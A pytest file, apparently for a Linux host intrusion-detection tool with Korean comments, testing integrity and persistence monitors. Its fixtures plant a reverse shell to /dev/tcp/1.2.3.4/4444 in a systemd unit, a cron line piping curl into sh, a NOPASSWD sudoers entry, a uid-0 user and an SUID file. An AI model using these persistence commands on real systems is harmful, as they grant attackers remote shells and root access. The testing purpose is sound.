import os

import alerts
from database import Alert, IntegrityBaseline
from monitor.integrity import (
    UNREADABLE, IntegrityMonitor, PersistenceMonitor, find_suid, sha256_file,
    summarize_authorized_keys, summarize_passwd, summarize_generic,
)


def spec(sev="CRITICAL"):
    return (sev, False, summarize_generic, "테스트 파일")


def test_permission_denied_is_not_treated_as_ok(tmp_path):
    p = tmp_path / "secret"
    p.write_text("x")
    os.chmod(p, 0)
    if os.geteuid() == 0:
        return  # root 는 항상 읽을 수 있다
    assert sha256_file(str(p)) == UNREADABLE
    m = IntegrityMonitor(watch={str(p): spec()})
    m.setup()
    assert m.health == "degraded" and str(p) in m.health_reason
    os.chmod(p, 0o600)


def test_modification_alert_with_diff_and_persisted_baseline(db, tmp_path):
    p = tmp_path / "sudoers"
    p.write_text("root ALL=(ALL) ALL\n")
    m = IntegrityMonitor(watch={str(p): spec()})
    m.setup()
    m.tick()
    assert db.query(Alert).count() == 0
    p.write_text("root ALL=(ALL) ALL\nmallory ALL=(ALL) NOPASSWD:ALL\n")
    m.tick()
    a = db.query(Alert).one()
    assert a.severity == "CRITICAL" and "+mallory ALL=(ALL) NOPASSWD:ALL" in a.evidence
    # 기준선이 DB 에 저장됨
    row = db.query(IntegrityBaseline).filter(IntegrityBaseline.key == f"file:{p}").one()
    assert row.digest == sha256_file(str(p))


def test_change_while_service_down_is_detected(db, tmp_path):
    p = tmp_path / "sshd_config"
    p.write_text("PermitRootLogin no\n")
    IntegrityMonitor(watch={str(p): spec()}).setup()
    p.write_text("PermitRootLogin yes\n")
    m2 = IntegrityMonitor(watch={str(p): spec()})   # 재시작
    m2.setup()
    a = db.query(Alert).one()
    assert "서비스 중지 중" in a.title_ko and "PermitRootLogin yes" in a.evidence


def test_summaries():
    old = "root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n"
    new = old + "eve:x:0:1001::/home/eve:/bin/bash\n"
    s = summarize_passwd(old, new)
    assert "사용자 추가: eve" in s and "uid 0" in s
    k_old = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGx0aW1lc3RhbXBrZXlmb3J0ZXN0aW5nMTIzNDU2Nzg5 me@laptop\n"
    k_new = k_old + "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRoaXNpc2Fub3RoZXJrZXlmb3J0ZXN0aW5nMTIzNDU2 attacker\n"
    s2 = summarize_authorized_keys(k_old, k_new)
    assert s2.startswith("키 추가:") and "attacker" in s2 and "SHA256:" in s2


def test_persistence_monitor_cron_and_suid(db, tmp_path):
    cron = tmp_path / "cron.d"
    cron.mkdir()
    (cron / "backup").write_text("0 3 * * * root /usr/local/bin/backup\n")
    sysd = tmp_path / "systemd"
    sysd.mkdir()
    bins = tmp_path / "bin"
    bins.mkdir()
    m = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m.setup()
    assert db.query(Alert).count() == 0   # 첫 실행은 기준선만
    (cron / "evil").write_text("* * * * * root curl http://x/y.sh | sh\n")
    (sysd / "evil.service").write_text("[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'\n")
    suid = bins / "rootme"
    suid.write_text("#!/bin/sh\n")
    os.chmod(suid, 0o4755)
    m.tick()
    rules = {a.rule: a for a in db.query(Alert).all()}
    assert rules["persistence_cron"].severity == "CRITICAL"       # curl | sh 패턴
    assert rules["persistence_systemd"].severity == "CRITICAL"    # /dev/tcp 패턴
    assert rules["persistence_suid"].severity == "CRITICAL"
    found, _ = find_suid([str(bins)])
    assert str(suid) in found
    # 재시작 후 같은 파일은 다시 알리지 않는다
    m2 = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m2.setup()
    assert db.query(Alert).count() == 3
